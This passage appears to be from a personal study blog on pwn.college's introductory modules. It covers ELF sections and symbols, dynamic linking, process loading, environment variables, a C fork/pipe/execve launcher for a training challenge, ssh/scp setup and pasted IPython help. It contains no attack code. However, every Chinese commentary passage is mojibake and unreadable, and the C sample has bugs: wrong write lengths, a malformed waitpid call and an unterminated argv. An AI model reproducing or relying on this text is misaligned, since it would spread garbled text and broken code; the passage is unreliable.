ELF properties.</li><li><input checked="" disabled="" type="checkbox"> <strong>objcopy</strong> to swap out ELF sections.</li><li><input disabled="" type="checkbox"> <strong>strip</strong> to remove otherwise-helpful information (such as symbols).</li><li><input disabled="" type="checkbox"> <a href="https://ide.kaitai.io/"><strong>kaitai struct</strong></a> to look through your ELF interactively</li></ul></li></ul><h3 id="ELF-base-struct"><a href="#ELF-base-struct" class="headerlink" title="ELF base struct"></a>ELF base struct</h3><p>ELF files are composed of three major components:</p><ul><li><strong>ELF Header</strong> : contains general information about the binary <code>readelf -h &lt;executable&gt;</code> </li><li><strong>Sections</strong> : comprise all information needed for linking a target object file in order to build a working executable <code>readelf -S &lt;executable&gt;</code></li><li><strong>Segments</strong> : break down the structure of an ELF binary into suitable chunks to prepare the executable to be loaded into memory</li></ul><blockquote><p>æ¯ä¸ªsectionçš„æ„ä¹‰è¿˜æ˜¯è¦æ³¨æ„ä¸€ä¸‹, æˆ‘åˆå€’å›æ¥çœ‹.got.pltäº†</p></blockquote><p>æ³¨æ„segmentåœ¨é“¾æ¥çš„æ—¶å€™æ²¡æœ‰ä½œç”¨, sectionåœ¨è¿è¡Œæ—¶æ²¡æœ‰ä½œç”¨.</p><p>ä¸€æ–¹é¢Segmenté€šè¿‡æŠŠsectionåˆ†ç»„æ¥æé«˜è£…è½½çš„æ•ˆç‡, å¦ä¸€æ–¹é¢è¦æ³¨æ„å¿…é¡»å’Œç‰©ç†é¡µå¤§å°å¯¹é½, ä»¥ä¾¿äºpteä¸­çš„æƒé™æ§åˆ¶.</p><h3 id="Symbols"><a href="#Symbols" class="headerlink" title="Symbols"></a>Symbols</h3><p><strong>Provide interface to Linkers and Debuggers to enforce their functionality.</strong> </p><p>.dynstræ˜¯.dynsymçš„string table, The section <em>.strtab</em> is the <em>String Table</em> of <em>.symtab Symbol Table</em>. è€Œä¸”string tableçš„entryæ•°é‡å’Œsymbol tableçš„entryæ•°é‡ä¸€è‡´.</p><p><img src="../../image/pwn-modules/photo_2018-01-13_11-28-32.jpg"></p><h3 id="relocation"><a href="#relocation" class="headerlink" title="relocation"></a>relocation</h3><ol><li><strong>Defining Relocations</strong> </li></ol><p>There are different types of <u>relocatable files</u>:</p><ul><li>Generic object files (*.o).     æ¯”è¾ƒç®€å•, å°±æ˜¯ä¸€ä¸ªé™æ€é“¾æ¥çš„æ–‡ä»¶.</li><li>Kernel object files (*.ko).     wait for future</li><li>Shared object files (*.so).    <ul><li>These type of relocatable files support being linked on runtime, and they may be shared across different processes. Consequently, relocations of dynamic dependencies have to be done at runtime. This process is known as Dynamic Linking.</li></ul></li></ul><p>Elfxx_Rel and Elfxx_Relaå·®åœ¨ä¸€ä¸ªAddendä¸Š, ä¹Ÿå°±æ˜¯è¦é‡å®šä½çš„ä½ç½®å’Œä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€çš„å·®å€¼<strong>å–å</strong>.</p><p>å…¶ä»–çš„éƒ¨åˆ†çœ‹åŸåšå®¢<a href="https://www.intezer.com/blog/malware-analysis/executable-and-linkable-format-101-part-3-relocations/">å°±è¡Œ</a>, ä¸œè¥¿å¤ªå¤šå¿…é¡»æ¯ä¸€æ®µæ„æ€éƒ½è¦æ‡‚, ä¸è¿‡é‡å®šä½æ¡ç›®æ¯”è¾ƒå°‘ä¹Ÿå®¹æ˜“è®°ä½.</p><h3 id="Dynamic-Linking"><a href="#Dynamic-Linking" class="headerlink" title="Dynamic Linking"></a>Dynamic Linking</h3><h4 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h4><p>Unlike in static linking, <em><strong>ld</strong></em> requires shared libraries to create a dynamically linked executable.<br>The output file will contain the <strong>executableâ€™s code</strong> and <strong>the names of the shared libraries</strong> required.</p><p>When the binary is executed, the dynamic linker will find the required dependencies to <strong>load</strong> and link them together.</p><h4 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h4><p>The dynamic linking process begins immediately after execution.</p><p>With dynamically linked programs, the system executes the fileâ€™s â€œ<strong>interpreter</strong>â€, which is an <u>intermediate</u> program that should <strong>set up the environment and only then execute the main binary</strong>. The interpreter lies in the <em>PT_INTERP</em> segment created by the compile-time linker (<em><strong>ld</strong></em>).</p><p>The dynamic linker will <strong>set up the environment</strong> <u>using dynamic entries</u> from the <em>.dynamic</em> section:</p><p>preparing the environment:</p><ol><li>Load the original fileâ€™s PT_LOAD segments in memory.</li><li>Use the <em>.dynamic</em> section/segment to read dependencies, search for them on disk and load them in memory as well. This is done recursively for dependent librariesâ€”they can be dynamically linked as well. The dependency searching algorithm is outlined in the <a href="http://man7.org/linux/man-pages/man8/ld.so.8.html">ld.so man page</a>.</li><li>Perform relocations â€“ shared libraries are loaded into non-deterministic addresses and must have absolute addresses patched, as well as resolving references to other object files.</li><li>Invoke shared library initialization functions (registered in the <em>.preinit_array, .init, .init_array</em> sections). <strong>What happened?</strong> </li><li>Finally, pass control back to the original binaryâ€™s entry point, making it seem to the binary that control was passed directly from <em>exec</em>.</li></ol><p>è¿˜è®²åˆ°äº†<strong>LD_PRELOAD</strong>å’Œ<strong>LD_LIBRARY_PATH</strong>å˜é‡â€¦è¿˜æ˜¯çœ‹åŸæ–‡å§â€¦</p><h4 id="Lazy-Linking"><a href="#Lazy-Linking" class="headerlink" title="Lazy Linking"></a>Lazy Linking</h4><p>lazy linkingçš„åŸå› æ˜¯å¦‚æœä¸€ä¸ªç¨‹åºå¼€å¤´å‡ºé”™äº†é©¬ä¸Šé€€å‡º, rendering useless all of the relocation work performed by the dynamic linker, æ‰€ä»¥å°†ä¸€äº›é“¾æ¥å·¥ä½œæ”¾åˆ°å®é™…è°ƒç”¨çš„æ—¶å€™.</p><p>åœ¨CSAPPä¸­çœ‹è¿‡äº†, åŸºæœ¬ç›¸åŒ, ä¸åŒåœ¨äºæä¾›äº†IDAçš„è§†å›¾çœ‹æ³•.</p><h2 id="Process-Loading"><a href="#Process-Loading" class="headerlink" title="Process Loading"></a>Process Loading</h2><ol><li><p>A process is created.</p><p> by fork() or clone() and execve().</p></li><li><p>Cat is loaded.</p><ul><li><p>must be executable</p><p>To figure out what to load, the Linux kernel reads the beginning of the file (i.e., /bin/cat), and makes a decision:</p></li><li><p>If the file starts with <strong>#!</strong>, the kernel extracts the interpreter from the rest of that line and executes this interpreter with the original file as an argument.</p></li><li><p>If the file matches a format in <strong>/proc/sys/fs/binfmt_misc</strong>, the kernel executes the interpreter specified for that format with the original file as an argument.</p></li><li><p>If the file is a <strong>dynamically-linked</strong> ELF, the kernel reads the interpreter/loader defined in the ELF, loads the interpreter and the original file, and lets the interpreter take control.</p></li><li><p>If the file is a <strong>statically-linked</strong> ELF, the kernel will load it.Other legacy file formats are checked for</p><p>notice the interpreter specified in .interp section.</p><p><strong>Dynamically linked ELFs: the loading process</strong> </p></li><li><p>The program and its interpreter are <u>loaded by the kernel</u>.</p></li><li><p>The interpreter <u>locates the libraries</u>.<br>  a. LD_PRELOAD environment variable, and anything in /etc/ld.so.preload<br>  b. LD_LIBRARY_PATH environment variable (can be set in the shell)<br>  c. DT_RUNPATH or DT_RPATH specified in the binary file (both can be modified with patchelf)<br>  d.system-wide configuration (/etc/ld.so.conf)<br>  e. /lib and /usr/lib</p></li><li><p>The interpreter <u>loads the libraries</u>.<br>  a.  these libraries can depend on other libraries, causing more to be loadedb.relocations updated</p></li></ul></li><li><p><a href="https://docs.google.com/presentation/d/1TwM5WLWnTqrNkpXjGKkaXYbKZEpatEQYA7ckBVXAOhs/edit#slide=id.g40953d030c_0_179">Cat is initialized</a>.</p><p> <strong>/proc/self/maps</strong> and <strong>attribute((constructor))</strong> </p></li></ol><p>Further readings:</p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-4.html">How does the Linux kernel run a program</a> </p><p><a href="https://gist.github.com/CMCDragonkai/10ab53654b2aa6ce55c11cfc5b2432a4">Linux: Understanding the Memory Layout of Linux Executables</a> </p><h2 id="Process-Execution"><a href="#Process-Execution" class="headerlink" title="Process Execution"></a>Process Execution</h2><p>ç”¨å‘½ä»¤è¡Œæ¼”ç¤ºäº†éå¸¸å¤šçš„å†…å®¹, åŸºæœ¬éƒ½æ²¡è§è¿‡æˆ‘å°½é‡è®°å½•ä¸‹ä¸€äº›ç»†èŠ‚. <a href="https://docs.google.com/presentation/d/1ezY9Q8I0tzDD-7ZDXMbQM5RQ7z1dvB9-U_nDEhc6qdE/edit#slide=id.g9279416eed_1_114">è°·æ­Œæ–‡æ¡£</a> </p><ol><li>Cat is launched.</li><li>Cat reads its arguments and environment.</li><li>Cat does its thing.</li><li>Cat terminates. </li></ol><p>ä¸Šé¢å››ä¸ªæ˜¯è¿™ä¸€éƒ¨åˆ†è¦è€ƒè™‘çš„æµç¨‹, æˆ‘ä¹ŸæŒ‰æµç¨‹èµ°:</p><h3 id="Cat-is-launched"><a href="#Cat-is-launched" class="headerlink" title="Cat is launched"></a>Cat is launched</h3><p><code>__libc_start_main()</code>, åˆæ˜¯è¿™ä¸ªå‡½æ•°, ä¸è¿‡åœ¨è¿™ä¹‹å‰è¿˜æœ‰ä¸€ä¸ª<code>_start()</code>, å½¢æˆ<code>_start()-&gt;__libc_start_main()-&gt;main()</code>æµç¨‹.</p><blockquote><p>å¯ä»¥æŒ‡å®šä¸€ä¸‹LD_PRELOADå‚æ•°æ¥æ”¹å˜__libc_start_main()ä¹‹ç±»çš„æ“ä½œ</p></blockquote><h3 id="Cat-reads-arg-amp-env"><a href="#Cat-reads-arg-amp-env" class="headerlink" title="Cat reads arg &amp; env"></a>Cat reads arg &amp; env</h3><p>åœ¨ä¸‹ä¸€èŠ‚ä¸­æœ‰ä»‹ç», è§†é¢‘é‡Œç¤ºèŒƒäº†ä¸€ä¸ªæ”¹ç¯å¢ƒå˜é‡çš„ä¾‹å­.</p><p>åœ¨æ‰§è¡ŒlsæŒ‡ä»¤çš„æ—¶å€™ æ·»åŠ <code>LANG = C</code>ç¯å¢ƒå˜é‡, ä¼šå¯¼è‡´æ’åºæŒ‰ç…§ASCIIç , å¦åˆ™ä¼šæŒ‰ç…§ç³»ç»Ÿé»˜è®¤çš„<code>en_US-UTF-8</code> </p><h3 id="Cat-does-thing"><a href="#Cat-does-thing" class="headerlink" title="Cat does thing"></a>Cat does thing</h3><p>è®²åˆ°äº†åº“å‡½æ•°, ç³»ç»Ÿè°ƒç”¨, ä¿¡å·, å…±äº«å†…å­˜. </p><p>é€šè¿‡nmæŒ‡ä»¤æ¥æŸ¥çœ‹symbol, straceçš„ä½¿ç”¨, ä»¥åŠlibcåº“å‡½æ•°å¯ä»¥ä¸ç”¨å†™å¤´æ–‡ä»¶, ä¸è¿‡ä¼šå¼•èµ·ä¸€ä¸ªéšå¼å£°æ˜è­¦å‘Š, å¯ä»¥é€šè¿‡manæ¥æŸ¥çœ‹éœ€è¦å¼•ç”¨ä»€ä¹ˆå¤´æ–‡ä»¶. </p><p>ä¿¡å·æ¼”ç¤ºçš„æ—¶å€™ç”¨äº†<code>ps pgrep</code>ä¸¤ä¸ªæŒ‡ä»¤, çœ‹psçš„manualçŸ¥é“äº†å‚æ•°æœ‰ä¸‰ç§é£æ ¼. å…±äº«å†…å­˜æ¼”ç¤ºäº†/dev/shm, <strong>è¿˜ä¸çŸ¥é“è¿™æ€ä¹ˆç”¨</strong> </p><p>è¿˜æœ‰ä¸€ä¸ªè¿›ç¨‹terminate, å’Œæˆ‘åœ¨æ“ä½œç³»ç»Ÿä¸­çœ‹åˆ°çš„ä¸€è‡´, ä¸é‡å¤äº†.</p><p>å‰©ä¸‹çš„åœ¨PPTé‡Œ.</p><h2 id="å‘½ä»¤è¡Œå‚æ•°å’Œç¯å¢ƒå˜é‡"><a href="#å‘½ä»¤è¡Œå‚æ•°å’Œç¯å¢ƒå˜é‡" class="headerlink" title="å‘½ä»¤è¡Œå‚æ•°å’Œç¯å¢ƒå˜é‡"></a>å‘½ä»¤è¡Œå‚æ•°å’Œç¯å¢ƒå˜é‡</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br></code></pre></div></td></tr></table></figure><p>mainå‡½æ•°çš„å‚æ•°, å…¶ä¸­argvå’Œenvpæ˜¯å­—ç¬¦ä¸²æ•°ç»„çš„æŒ‡é’ˆ, æ‰€ä»¥æ˜¯äºŒé‡æŒ‡é’ˆ, ä¸¤ä¸ªæ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ æ˜¯null.</p><p>å°±åƒè¿™æ ·å­:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc -o <span class="hljs-built_in">test</span> test.c</span><br><span class="hljs-meta">$</span><span class="bash"> ./<span class="hljs-built_in">test</span> testing</span><br>The number of arguments is: 2<br><br>First arg:     The program name is: ./test<br>Second arg: The first argument is: testing<br><br>The first environment variable is: PWD=/home/yans # process working directory<br>The second environment variable is: SHLVL=1<br></code></pre></div></td></tr></table></figure><p><code>env</code> runs a command with a modified environment. ä¹Ÿå¯ä»¥è®¾ç½®ç‰¹å®šçš„ç¯å¢ƒå˜é‡.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> env -i ./countenv</span>                   <br>There are 0 environment variables.<br></code></pre></div></td></tr></table></figure><h2 id="PIPE"><a href="#PIPE" class="headerlink" title="PIPE"></a>PIPE</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess</span> &#123;</span><br>    <span class="hljs-keyword">int</span> pid;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stdin</span>;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stdout</span>;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stderr</span>;<br>&#125;;<br><span class="hljs-keyword">void</span> __close(<span class="hljs-keyword">int</span> fd) &#123;<br>    <span class="hljs-keyword">if</span> (close(fd) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not close pipe end&quot;</span> ); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mk_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fds[<span class="hljs-number">2</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pipe(fds) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not create pipe&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mv_fd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (dup2(fd1,  fd2) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not duplicate pipe end&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>    __close(fd1);<br>&#125;<br><br><span class="hljs-comment">// Start program at argv[0] with arguments argv.</span><br><span class="hljs-comment">// Set up new stdin, stdout and stderr.</span><br><span class="hljs-comment">// Puts references to new process and pipes into `p`.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">call</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* argv[], struct subprocess * p)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> child_in[<span class="hljs-number">2</span>]; <span class="hljs-keyword">int</span> child_out[<span class="hljs-number">2</span>]; <span class="hljs-keyword">int</span> child_err[<span class="hljs-number">2</span>];<br>    pipe(child_in); pipe(child_out); pipe(child_err);<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        __close(<span class="hljs-number">0</span>); __close(<span class="hljs-number">1</span>); __close(<span class="hljs-number">2</span>);                                 <span class="hljs-comment">// __close parent pipes</span><br>        __close(child_in[<span class="hljs-number">1</span>]); __close(child_out[<span class="hljs-number">0</span>]); __close(child_err[<span class="hljs-number">0</span>]); <span class="hljs-comment">// unused child pipe ends</span><br>        mv_fd(child_in[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>); mv_fd(child_out[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>); mv_fd(child_err[<span class="hljs-number">1</span>], <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">char</span>* envp[] = &#123; <span class="hljs-string">&quot;\0&quot;</span> &#125;;<br>        <span class="hljs-comment">//write(1,&quot;what the fuck&quot;, 30);</span><br>        <span class="hljs-keyword">int</span> r=execve(<span class="hljs-string">&quot;/challenge/embryoio_level40&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;failure in exec&quot;</span>, <span class="hljs-number">30</span>) ;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        __close(child_in[<span class="hljs-number">0</span>]); __close(child_out[<span class="hljs-number">1</span>]); __close(child_err[<span class="hljs-number">1</span>]); <span class="hljs-comment">// unused child pipe ends</span><br>        p-&gt;pid = pid;<br>        p-&gt;<span class="hljs-built_in">stdin</span> = child_in[<span class="hljs-number">1</span>];   <span class="hljs-comment">// parent wants to write to subprocess child_in</span><br>        p-&gt;<span class="hljs-built_in">stdout</span> = child_out[<span class="hljs-number">0</span>]; <span class="hljs-comment">// parent wants to read from subprocess child_out</span><br>        p-&gt;<span class="hljs-built_in">stderr</span> = child_err[<span class="hljs-number">0</span>]; <span class="hljs-comment">// parent wants to read from subprocess child_err</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from parent process!\n&quot;</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess</span> <span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">char</span>* argv[] = &#123;<span class="hljs-string">&quot;/challenge/embryoio_level40&quot;</span>, <span class="hljs-string">&quot;\0&quot;</span>&#125;;<br>    call(argv, &amp;proc);<br><span class="hljs-comment">//    mv_fd(STDIN_FILENO, proc.stdin);</span><br><span class="hljs-comment">//    mv_fd(STDOUT_FILENO, proc.stdout);</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">2048</span>];<br>    <span class="hljs-keyword">char</span> buf_[<span class="hljs-number">2048</span>];<br>    read(proc.<span class="hljs-built_in">stdout</span>, buf, <span class="hljs-number">2048</span>);<br>    read(proc.<span class="hljs-built_in">stderr</span>, buf_,<span class="hljs-number">2048</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf_);<br>    waitpid(proc.pid);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h2><p>çœŸçš„æ˜¯ç›¸å½“å¤š, è§<a href="https://pwn.college/modules/interaction">è¿™é‡Œ</a> </p><p>æœ‰ä¸ª<a href="https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf">pwntools-cheatsheet</a>æ¯”è¾ƒç‰¹åˆ«, åº”è¯¥èƒ½ç”¨ä¸Š</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><blockquote><p>æ€ä¹ˆä¼šæœ‰ä¸€ç™¾å¤šä¸ª, ä¹Ÿå¤ªç¦»è°±äº†</p></blockquote><p>åŸºæœ¬è¿æ¥æ–¹å¼: ssh</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh-keygen -f pwnkey<br>cat pwnkey.pub #copy public key<br>ssh -i pwnkey hacker@dojo.pwn.college -v<br></code></pre></div></td></tr></table></figure><p>åœ¨/challenge/[å¯¹åº”æ–‡ä»¶]ä¸­, ç›´æ¥æ‰§è¡Œå³å¯</p><ul><li>ä»è¿œç¨‹æœºå™¨å¤åˆ¶æ–‡ä»¶:</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i pwnkey hacker@dojo.pwn.college:/challenge/checker.py ./<br></code></pre></div></td></tr></table></figure><h3 id="level-å‡ æ¥ç€"><a href="#level-å‡ æ¥ç€" class="headerlink" title="level(å‡ æ¥ç€)"></a>level(å‡ æ¥ç€)</h3><p>è¦æ±‚ä»¥0ä¸ªç¯å¢ƒå˜é‡è¿è¡Œç¨‹åº, å¯ä»¥ä½¿ç”¨execveå‡½æ•°, envå‘½ä»¤, execå‘½ä»¤ä¸‰ç§æ–¹æ³•</p><blockquote><p>å…¶ä½™çš„å¤§æ¦‚å°±æ˜¯åŠ ç¯å¢ƒå˜é‡, åŠ å‚æ•°, å†™åœ¨è„šæœ¬é‡Œä¹‹ç±»çš„ç®€å•é¢˜</p></blockquote><h3 id="level15æ–°ä¸œè¥¿"><a href="#level15æ–°ä¸œè¥¿" class="headerlink" title="level15æ–°ä¸œè¥¿"></a>level15æ–°ä¸œè¥¿</h3><p>æ–°çš„ä¸€ä¸ªä¸œè¥¿: ipython, An enhenced interactive python, å¢åŠ äº†ä¸€äº›ç‰¹åˆ«çš„åŠŸèƒ½, è¿˜æœ‰ä¸ªè¯´æ˜ä¹¦æ”¾åœ¨æœ¬levelçš„æœ«å°¾.</p><p>sshæ¥ä¸Šå, è¿›å…¥ipython, ç„¶åCtrl+Oå°±å¯ä»¥ç¼–è¾‘å¤šè¡Œè„šæœ¬äº†, ä½¿ç”¨çš„è¿˜æ˜¯pwntools, ç®—æ˜¯ç†Ÿæ‚‰ä¸€ç‚¹.</p><p>æœ‰ä¸¤ç§æ–¹æ³•: </p><ol><li><code>!exec /challenge/embryoio_level15</code> </li><li>ç”¨<code>pwn.process()</code> </li></ol><h3 id="Python-â€“-An-enhanced-Interactive-Python"><a href="#Python-â€“-An-enhanced-Interactive-Python" class="headerlink" title="Python â€“ An enhanced Interactive Python"></a>Python â€“ An enhanced Interactive Python</h3><p>IPython offers a fully compatible replacement for the standard Python<br>interpreter, with convenient shell features, special commands, command<br>history mechanism and output results caching.</p><p>At your system command line, type â€˜ipython -hâ€™ to see the command line<br>options available. This document only describes interactive features.</p><h5 id="GETTING-HELP"><a href="#GETTING-HELP" class="headerlink" title="GETTING HELP"></a>GETTING HELP</h5><p>Within IPython you have various way to access help:</p><p>  <strong>?     -&gt; Introduction and overview of IPythonâ€™s features (this screen).</strong><br>  object?   -&gt; Details about â€˜objectâ€™.<br>  object??  -&gt; More detailed, verbose information about â€˜objectâ€™.<br>  %quickref -&gt; Quick reference of all IPython specific syntax and magics.<br>  help      -&gt; Access Pythonâ€™s own help system.</p><p>If you are in terminal IPython you can quit this screen by pressing <code>q</code>.</p><h5 id="MAIN-FEATURES"><a href="#MAIN-FEATURES" class="headerlink" title="MAIN FEATURES"></a>MAIN FEATURES</h5><ul><li><p>Access to the standard Python help with object docstrings and the Python<br>  manuals. Simply type â€˜helpâ€™ (no quotes) to invoke it.</p></li><li><p>Magic commands: type %magic for information on the magic subsystem.</p></li><li><p>System command aliases, via the %alias command or the configuration file(s).</p></li><li><p>Dynamic object information:</p><p>  Typing ?word or word? prints detailed information about an object. Certain<br>  long strings (code, etc.) get snipped in the center for brevity.</p><p>  Typing ??word or word?? gives access to the full information without<br>  snipping long strings. Strings that are longer than the screen are printed<br>  through the less pager.</p><p>  The ?/?? system gives access to the full source code for any object (if<br>  available), shows function prototypes and other useful information.</p><p>  If you just want to see an objectâ€™s docstring, type â€˜%pdoc objectâ€™ (without<br>  quotes, and without % if you have automagic on).</p></li><li><p><strong>Tab completion in the local namespace:</strong> </p><p>  At any time, hitting tab will complete any available python commands or<br>  variable names, and show you a list of the possible completions if thereâ€™s<br>  no unambiguous one. It will also complete filenames in the current directory.</p></li><li><p><strong>Search previous command history in multiple ways:</strong> </p><ul><li><p>Start typing, and then use arrow keys up/down or (Ctrl-p/Ctrl-n) to search<br>  through the history items that match what youâ€™ve typed so far.</p></li><li><p>Hit Ctrl-r: opens a search prompt. Begin typing and the system searches<br>  your history for lines that match what youâ€™ve typed so far, completing as<br>  much as it can.</p></li><li><p>%hist: search history by index.</p></li></ul></li><li><p><strong>Persistent command history across sessions.</strong></p></li><li><p>Logging of input with the ability to save and restore a working session.</p></li><li><p><strong>System shell with !. Typing !ls will run â€˜lsâ€™ in the current directory.</strong></p></li><li><p>The reload command does a â€˜deepâ€™ reload of a module: changes made to the<br>  module since you imported will actually be available without having to exit.</p></li><li><p>Verbose and colored exception traceback printouts. See the magic xmode and<br>  xcolor functions for details (just type %magic).</p></li><li><p>Input caching system:</p><p>  IPython offers numbered prompts (In/Out) with input and output caching. All<br>  input is saved and can be retrieved as variables (besides the usual arrow<br>  key recall).</p><p>  The following GLOBAL variables always exist (so donâ€™t overwrite them!):<br>  _i: stores previous input.<br>  _ii: next previous.<br>  _iii: next-next previous.<br>  _ih : a list of all input _ih[n] is the input from line n.</p><p>  Additionally, global variables named _i&lt;n&gt; are dynamically created (&lt;n&gt;<br>  being the prompt counter), such that _i&lt;n&gt; == _ih[&lt;n&gt;]</p><p>  For example, what you typed at prompt 14 is available as _i14 and _ih[14].</p><p>  You can create macros which contain multiple input lines from this history,<br>  for later re-execution, with the %macro function.</p><p>  The history function %hist allows you to see any part of your input history<br>  by printing a range of the _i variables. Note that inputs which contain<br>  magic functions (%) appear in the history with a prepended comment. This is<br>  because they arenâ€™t really valid Python code, so you canâ€™t exec them.</p></li><li><p>Output caching system:</p><p>  For output that is returned from actions, a system similar to the input<br>  cache exists but using _ instead of _i. Only actions that produce a result<br>  (NOT assignments, for example) are cached. If you are familiar with<br>  Mathematica, IPythonâ€™s _ variables behave exactly like Mathematicaâ€™s %<br>   variables.</p><p>  The following GLOBAL variables always exist (so donâ€™t overwrite them!):<br>  _ (one underscore): previous output.<br>  __ (two underscores): next previous.<br>  ___ (three underscores): next-next previous.</p><p>  Global variables named _<n> are dynamically created (<n> being the prompt<br>  counter), such that the result of output <n> is always available as _<n>.</p><p>  Finally, a global dictionary named _oh exists with entries for all lines<br>  which generated output.</p></li><li><p><strong><mark>Directory history:</mark></strong> </p><p>  <strong>Your history 